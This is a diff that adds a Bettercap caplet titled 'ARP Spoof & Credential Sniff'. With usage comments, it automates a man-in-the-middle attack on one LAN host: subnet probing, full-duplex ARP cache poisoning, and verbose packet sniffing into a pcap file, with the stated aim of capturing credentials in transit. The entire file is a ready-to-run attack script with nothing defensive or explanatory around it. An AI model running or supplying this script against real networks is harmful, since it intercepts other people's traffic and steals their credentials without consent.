@@ -1,0 +1,28 @@
+# =============================================================================
+# Bettercap Caplet — ARP Spoof & Credential Sniff
+# =============================================================================
+# Usage: sudo bettercap -caplet arp-spoof.cap
+#
+# This caplet automates the full MITM attack chain:
+#   1. Probe the local subnet for active hosts
+#   2. Configure full-duplex ARP cache poisoning against the target
+#   3. Enable packet sniffing to capture credentials in transit
+#
+# Modify TARGET_IP before running.
+# =============================================================================
+
+# -- Target Configuration --
+set arp.spoof.targets 192.168.1.8
+
+# -- Phase 1: Network Reconnaissance --
+net.probe on
+
+# -- Phase 2: ARP Spoofing (Full-Duplex) --
+set arp.spoof.fullduplex true
+set arp.spoof.internal true
+arp.spoof on
+
+# -- Phase 3: Traffic Sniffing --
+set net.sniff.verbose true
+set net.sniff.output /tmp/camera-capture.pcap
+net.sniff on
